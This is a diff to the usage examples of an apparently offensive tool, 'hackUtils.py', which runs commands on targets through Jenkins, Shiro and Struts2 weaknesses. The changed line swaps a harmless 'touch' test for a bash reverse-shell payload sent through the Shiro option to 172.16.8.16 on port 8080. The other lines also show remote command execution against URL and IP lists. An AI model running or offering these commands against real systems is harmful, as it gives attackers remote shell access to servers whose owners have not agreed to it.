@@ -40,7 +40,7 @@ Examples:
     hackUtils.py -k 10.10.10.10::dir
     hackUtils.py -k ips.txt
     hackUtils.py -k ips.txt::"touch /tmp/jenkins"
-    hackUtils.py -o http://www.shiro.com/::"touch /tmp/shiro"
+    hackUtils.py -o http://www.shiro.com/::"bash -i >& /dev/tcp/172.16.8.16/8080 0>&1"
     hackUtils.py -o urls.txt::"touch /tmp/shiro"
     hackUtils.py -s http://www.struts2.com/index.action
     hackUtils.py -s urls.txt
